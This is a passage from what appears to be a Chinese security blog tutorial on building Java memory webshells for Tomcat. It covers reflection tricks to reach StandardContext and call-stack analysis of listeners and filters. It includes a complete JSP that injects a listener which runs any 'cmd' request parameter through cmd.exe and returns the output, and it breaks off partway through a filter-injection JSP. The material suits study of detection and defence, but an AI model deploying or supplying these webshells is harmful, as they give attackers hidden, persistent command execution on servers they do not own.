title=\"有request对象时\"></a>有request对象时</h3><blockquote>\n<p>web应用中request.getServletContext是ApplicationContextFacade对象。该对象对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，所以当request存在的时候我们可以通过反射来获取StandardContext对象</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ServletContext servletContext = request.getServletContext();<span class=\"comment\">//获取到applicationcontextFacade  </span></span><br><span class=\"line\">Field fieldApplicationContext = servletContext.getClass().getDeclaredField(<span class=\"string\">&quot;context&quot;</span>);<span class=\"comment\">//利用反射获取ApplicationContext对象  </span></span><br><span class=\"line\">fieldApplicationContext.setAccessible(<span class=\"keyword\">true</span>);<span class=\"comment\">//使私有可获取  </span></span><br><span class=\"line\">ApplicationContext applicationContext = (ApplicationContext) fieldApplicationContext.get(servletContext);<span class=\"comment\">//获取到ApplicationContext对象  </span></span><br><span class=\"line\"></span><br><span class=\"line\">Field fieldStandardContext = applicationContext.getClass().getDeclaredField(<span class=\"string\">&quot;context&quot;</span>);<span class=\"comment\">//利用反射获取StandardContext对象  </span></span><br><span class=\"line\">fieldStandardContext.setAccessible(<span class=\"keyword\">true</span>);<span class=\"comment\">//使私有可获取  </span></span><br><span class=\"line\">StandardContext standardContext = (StandardContext) fieldStandardContext.get(applicationContext);<span class=\"comment\">//获取到StandardContext对象</span></span><br></pre></td></tr></table></figure>\n\n<p>看到还存在一种方式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Field reqF = request.getClass().getDeclaredField(<span class=\"string\">&quot;request&quot;</span>);</span><br><span class=\"line\">reqF.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">Request req = (Request) reqF.get(request);</span><br><span class=\"line\">StandardContext stdcontext = (StandardContext) req.getContext();</span><br></pre></td></tr></table></figure>\n\n<p>实际 Tomcat 在使用 request 的时候不是用的 Request 这个类，而是 RequestFacade，来看一下</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428110656959.png\" alt=\"image-20220428110656959\"></p>\n<p>而在Request中，存在方法 getContext，获取context</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428110742571.png\" alt=\"image-20220428110742571\"></p>\n<h3 id=\"无request对象时-坑\"><a href=\"#无request对象时-坑\" class=\"headerlink\" title=\"无request对象时(坑)\"></a>无request对象时(坑)</h3><p>存在以下几种方式</p>\n<ul>\n<li><strong>currentThread中的ContextClassLoader中获取</strong></li>\n<li><strong>ThreadLocal中获取</strong></li>\n<li><strong>从MBean中获取</strong></li>\n</ul>\n<p>实现方式先挖坑</p>\n<p><a href=\"https://xz.aliyun.com/t/11003#toc-4\">JAVA内存马的“一生” - 先知社区 (aliyun.com)</a></p>\n<p><a href=\"https://myzxcg.com/2021/10/Tomcat-%E6%9E%B6%E6%9E%84%E4%B8%8EContext%E5%88%86%E6%9E%90/#%E8%8E%B7%E5%8F%96standardcontext\">Tomcat 架构与Context分析 | MYZXCG</a></p>\n<p><a href=\"https://xz.aliyun.com/t/9914#toc-5\">Java内存马：一种Tomcat全版本获取StandardContext的新方法 - 先知社区 (aliyun.com)</a></p>\n<h1 id=\"内存马的分类\"><a href=\"#内存马的分类\" class=\"headerlink\" title=\"内存马的分类\"></a>内存马的分类</h1><p>大致分为三类</p>\n<ul>\n<li>基于动态添加Servlet组件的内存马</li>\n<li>基于动态添加框架组件的内存马</li>\n<li>基于 Javaagent 和 Javassist 技术的内存马</li>\n</ul>\n<p>将按照顺序进行学习与实现</p>\n<h1 id=\"内存马的实现\"><a href=\"#内存马的实现\" class=\"headerlink\" title=\"内存马的实现\"></a>内存马的实现</h1><h2 id=\"动态注册Servlet三大件\"><a href=\"#动态注册Servlet三大件\" class=\"headerlink\" title=\"动态注册Servlet三大件\"></a>动态注册Servlet三大件</h2><p>这部分就是对于 <strong>Listener、Filter、servlet</strong> 进行对应的实现</p>\n<h3 id=\"Listener\"><a href=\"#Listener\" class=\"headerlink\" title=\"Listener\"></a>Listener</h3><p>Listener即为监听器，用来监听对象或流程的创建与销毁，分为三类</p>\n<ul>\n<li>ServletContext，服务器启动与终止时触发</li>\n<li>Session，与Session操作有关</li>\n<li>Request，访问服务时触发</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427223133595.png\" alt=\"image-20220427223133595\"></p>\n<p>其中Request对象的监听器适合做内存马。</p>\n<p>对于listener的引入，需要实现两种接口<strong>LifecycleListener</strong>和原生<strong>EvenListener</strong></p>\n<p>实现了<strong>LifecycleListener</strong>接口的监听器一般作用于tomcat初始化启动阶段，此时客户端的请求还没进入解析阶段，不适合用于内存马。</p>\n<p>所以来看另一个<strong>EventListener</strong>接口，在Tomcat中，自定义了很多继承于<strong>EventListener</strong>的接口，应用于各个对象的监听。</p>\n<p>idea中 <strong>ctrl+H</strong> 查看实现接口的类</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427230228713.png\" alt=\"image-20220427230228713\"></p>\n<p>其中就有ServletRequestListener，来看一下这个接口，提供了两个方法，用于监听<code>ServletRequest</code>对象的创建和销毁，当我们访问任意资源，无论是servlet、jsp还是静态资源，都会触发<code>requestInitialized</code>方法，这样可以在访问请求时，实现恶意代码的触发</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427230436522.png\" alt=\"image-20220427230436522\"></p>\n<h4 id=\"简单监听器的实现\"><a href=\"#简单监听器的实现\" class=\"headerlink\" title=\"简单监听器的实现\"></a>简单监听器的实现</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.ServletRequestEvent;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.ServletRequestListener;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestListener</span> <span class=\"keyword\">implements</span> <span class=\"title\">ServletRequestListener</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">requestDestroyed</span><span class=\"params\">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;requestDestroyed&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">requestInitialized</span><span class=\"params\">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;requestInitialized&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>添加web.xml</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;listener&gt;</span><br><span class=\"line\">     &lt;listener-class&gt;TestListener&lt;&#x2F;listener-class&gt;</span><br><span class=\"line\">&lt;&#x2F;listener&gt;</span><br></pre></td></tr></table></figure>\n\n<p>任意访问，发现确实是执行了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427232113842.png\" alt=\"image-20220427232113842\"></p>\n<h4 id=\"流程分析\"><a href=\"#流程分析\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h4><p>一个断点下到 requestInitialized，看下调用链</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">requestInitialized:12, TestListener</span><br><span class=\"line\">fireRequestInitEvent:5982, StandardContext (org.apache.catalina.core)</span><br><span class=\"line\">invoke:121, StandardHostValve (org.apache.catalina.core)</span><br><span class=\"line\">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><br><span class=\"line\">invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class=\"line\">invoke:78, StandardEngineValve (org.apache.catalina.core)</span><br><span class=\"line\">service:364, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class=\"line\">service:624, Http11Processor (org.apache.coyote.http11)</span><br><span class=\"line\">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class=\"line\">process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class=\"line\">doRun:1673, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class=\"line\">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class=\"line\">runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class=\"line\">run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class=\"line\">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class=\"line\">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427233619096.png\" alt=\"image-20220427233619096\"></p>\n<p>在StandardContext#fireRequestInitEvent()中通过 调用本类中的 getApplicationEventListeners()获取到 listener，最后调用requestInitialized(event)，传入的event就是一些request的信息</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427234213687.png\" alt=\"image-20220427234213687\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427233716767.png\" alt=\"image-20220427233716767\"></p>\n<p>跟进 StandardContext#getApplicationEventListeners()，返回了 applicationEventListenersList</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427234453198.png\" alt=\"image-20220427234453198\"></p>\n<p>搜一下，不难发现 StandardContext#addApplicationEventListener() 添加了listener</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428001143412.png\" alt=\"image-20220428001143412\"></p>\n<p>那内存马实现方式就有思路了，通过反射调用 StandardContext#addApplicationEventListener() 添加我们编写的恶意listener</p>\n<h4 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h4><p>test.jsp</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyListener</span> <span class=\"keyword\">implements</span> <span class=\"title\">ServletRequestListener</span></span>&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">requestDestroyed</span><span class=\"params\">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class=\"line\">            HttpServletRequest req =(HttpServletRequest) sre.getServletRequest();</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>) != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">                InputStream in = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    in = Runtime.getRuntime().exec(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>,<span class=\"string\">&quot;/c&quot;</span>,req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class=\"line\">                    Scanner s = <span class=\"keyword\">new</span> Scanner(in).useDelimiter(<span class=\"string\">&quot;\\\\A&quot;</span>);</span><br><span class=\"line\">                    String out = s.hasNext()?s.next():<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">//反射获取 response</span></span><br><span class=\"line\">                    Field requestF = req.getClass().getDeclaredField(<span class=\"string\">&quot;request&quot;</span>);</span><br><span class=\"line\">                    requestF.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">                    Request request = (Request)requestF.get(req);</span><br><span class=\"line\">                    request.getResponse().getWriter().write(out);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (IOException e) &#123; &#125;</span><br><span class=\"line\">                  <span class=\"keyword\">catch</span> (NoSuchFieldException e) &#123; &#125;</span><br><span class=\"line\">                  <span class=\"keyword\">catch</span> (IllegalAccessException e) &#123; &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">requestInitialized</span><span class=\"params\">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    Field reqF = request.getClass().getDeclaredField(<span class=\"string\">&quot;request&quot;</span>);</span><br><span class=\"line\">    reqF.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">    Request req = (Request) reqF.get(request);</span><br><span class=\"line\">    StandardContext stdcontext = (StandardContext) req.getContext();</span><br><span class=\"line\">    MyListener myListener = <span class=\"keyword\">new</span> MyListener();</span><br><span class=\"line\">    stdcontext.addApplicationEventListener(myListener);</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428111216794.png\" alt=\"image-20220428111216794\"></p>\n<h3 id=\"Filter\"><a href=\"#Filter\" class=\"headerlink\" title=\"Filter\"></a>Filter</h3><p>filter就是在请求到达servlet前进行一次预处理，访问资源完成后，再次返回到filter中，可以实现身份权限验证，日志记录</p>\n<h4 id=\"简单过滤器的实现\"><a href=\"#简单过滤器的实现\" class=\"headerlink\" title=\"简单过滤器的实现\"></a>简单过滤器的实现</h4><p>TestFilter</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestFilter</span> <span class=\"keyword\">implements</span> <span class=\"title\">Filter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">(FilterConfig filterConfig)</span> <span class=\"keyword\">throws</span> ServletException </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]filter init&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doFilter</span><span class=\"params\">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//放行前，对 request处理</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;before filter&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//放行，调用下一个filter链</span></span><br><span class=\"line\">        chain.doFilter(request,response);</span><br><span class=\"line\">        <span class=\"comment\">//放行后，对response处理</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;after filter&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">destroy</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]filter destroy&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>添加web.xml</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;filter&gt;</span><br><span class=\"line\">    &lt;filter-name&gt;TestFilter&lt;&#x2F;filter-name&gt;</span><br><span class=\"line\">    &lt;filter-class&gt;TestFilter&lt;&#x2F;filter-class&gt;</span><br><span class=\"line\">&lt;&#x2F;filter&gt;</span><br><span class=\"line\">&lt;filter-mapping&gt;</span><br><span class=\"line\">    &lt;filter-name&gt;TestFilter&lt;&#x2F;filter-name&gt;</span><br><span class=\"line\">    &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt;</span><br><span class=\"line\">&lt;&#x2F;filter-mapping&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428115408269.png\" alt=\"image-20220428115408269\"></p>\n<h4 id=\"流程分析-1\"><a href=\"#流程分析-1\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h4><p>一个断点下到 <strong>chain.doFilter(request,response);</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">doFilter:13, TestFilter</span><br><span class=\"line\">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class=\"line\">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class=\"line\">invoke:196, StandardWrapperValve (org.apache.catalina.core)</span><br><span class=\"line\">invoke:97, StandardContextValve (org.apache.catalina.core)</span><br><span class=\"line\">invoke:542, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class=\"line\">invoke:135, StandardHostValve (org.apache.catalina.core)</span><br><span class=\"line\">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><br><span class=\"line\">invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class=\"line\">invoke:78, StandardEngineValve (org.apache.catalina.core)</span><br><span class=\"line\">service:364, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class=\"line\">service:624, Http11Processor (org.apache.coyote.http11)</span><br><span class=\"line\">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class=\"line\">process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class=\"line\">doRun:1673, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class=\"line\">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class=\"line\">runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class=\"line\">run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class=\"line\">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class=\"line\">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428115638585.png\" alt=\"image-20220428115638585\"></p>\n<p>ApplicationFilterChain#internalDoFilter()，从当前的 filters数组中取出一个filterConfig类型的对象，然后调用getFilter()获取filter后调用doFilter()，也就是我们编写的doFilter方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428154710366.png\" alt=\"image-20220428154710366\"></p>\n<p>看一下filters是怎么定义的，通过 创建了 ApplicationFilterConfig 对象来定义的对象数组，这里的值是怎么改变的后面在说</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428155718027.png\" alt=\"image-20220428155718027\"></p>\n<p>向上 ApplicationFilterChain#doFilter() 调用了 internalDoFilter() </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428162936642.png\" alt=\"image-20220428162936642\"></p>\n<p>向上，在 StandardWrapperValve#invoke()中，filterChain中存放了两个 ApplicationFilterConfig 类型的filter，第一个就是自己创建的filter</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428163206210.png\" alt=\"image-20220428163206210\"></p>\n<p>跟一下 filterChain 的定义，在 StandardWrapperValve#invoke中通过 createFilterChain() 获得了一个 ApplicationFilterChain 的对象</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428152749125.png\" alt=\"image-20220428152749125\"></p>\n<p><strong>那么 createFilterChain() 需要重点关注，看看它是怎么把我们编写的TestFiler添加到ApplicationFilterConfig类型的filters变量中</strong>，跟进 ApplicationFilterFactory#createFilterChain，首先获取Request，然后通过getFilterChain()获取filterChain</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506152221020.png\" alt=\"image-20220506152221020\"></p>\n<p>往下通过 StandardContext 对象的findFilterMaps()获取filterMaps[]</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428170204636.png\" alt=\"image-20220428170204636\"></p>\n<p>通过遍历 filterMaps[]，找到 StandardContext 对象中的FilterConfig，然后通过filterChain.addFilter把FilterConfig加入了filterChain中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428170549419.png\" alt=\"image-20220428170549419\"></p>\n<p>跟进 ApplicationFilterChain#addFilter()，将传入的 filterConfig 添加到ApplicationFilterConfig中，这里就对应上面改变filters的值的地方</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428173308779.png\" alt=\"image-20220428173308779\"></p>\n<p>这里需要关注三个变量</p>\n<ol>\n<li><strong>filterConfigs：</strong>存放 <strong>filterDef（见 filterDefs） **，</strong>filter 实例对象**及其他信息</li>\n<li><strong>filterDefs：</strong>存放<strong>过滤器名、过滤器全限定名</strong>及其他信息</li>\n<li><strong>filterMaps</strong>：存放<strong>过滤器名字（</strong>FilterName <strong>）</strong>及<strong>对应作用 url（</strong>URLPattern<strong>）</strong></li>\n</ol>\n<p>存放在StandardContext对象context中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506155640818.png\" alt=\"image-20220506155640818\"></p>\n<p>联系到Filter型内存马，肯定需要找到能修改StandardContext对象中这三个变量的值的地方。既然三个变量从StandardContext中获得，我们去查看有什么方法进行修改</p>\n<p>1）filterMaps</p>\n<p>找到了两个方法 StandardContext#addFilterMap() 和 StandardContext#addFilterMapBefore()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506160629266.png\" alt=\"image-20220506160629266\"></p>\n<p>2）filterConfigs</p>\n<p>找到了StandardContext#filterStart()，根据查找的资料这个方法主要功能为：根据filterDefs初始化 filterConfigs，从代码可知先将filterDefs从HashMap类型转为集合类型，然后获取一个迭代器，通过while进行遍历，获取name，通过一个ApplicationFilterConfig类型的对象filterConfig，获得filter的实例，最后通过put，添加到filterConfigs</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506163749910.png\" alt=\"image-20220506163749910\"></p>\n<p>3）filterDefs</p>\n<p>从上面可以看出来，最原始的数据都是从filterDefs中获得的，搜索它的值从什么地方来找到了<strong>StandardContext#addFilterDef()</strong></p>\n<p>tomcat启动时，去解析web.xml时会调用这里所以我们去简单跟进一下web.xml的启动过程。</p>\n<p>ContextConfig#configureStart()调用ContextConfig#webConfig()，使用webxml解析器来解析web.xml然后存放到webxml变量中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506182316657.png\" alt=\"image-20220506182316657\"></p>\n<p>又调用ContextConfig#configureContext()获取web.xml中的filter，进行遍历然后调用StandardContext#addFilterDef()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506182131998.png\" alt=\"image-20220506182131998\"></p>\n<p>StandardContext#addFilterDef()，传入name 和 filterDef</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506175731942.png\" alt=\"image-20220506175731942\"></p>\n<h4 id=\"实现-1\"><a href=\"#实现-1\" class=\"headerlink\" title=\"实现\"></a>实现</h4><p>理解了过程，就可以通过控制filterMaps、filterConfigs、filterDefs的值，则可以注入恶意的filter</p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;&lt;%--</span><br><span class=\"line\">  Created by IntelliJ IDEA.</span><br><span class=\"line\">  User: cys</span><br><span class=\"line\">  Date: <span class=\"number\">2022</span>/<span class=\"number\">5</span>/<span class=\"number\">6</span></span><br><span class=\"line\">  Time: <span class=\"number\">18</span>:<span class=\"number\">30</span></span><br><span class=\"line\">  To change <span class=\"keyword\">this</span> template use File | Settings | File Templates.</span><br><span class=\"line\">--%&gt;</span><br><span class=\"line\">&lt;%@ page contentType=<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span> language=<span class=\"string\">&quot;java&quot;</span> %&gt;</span><br><span 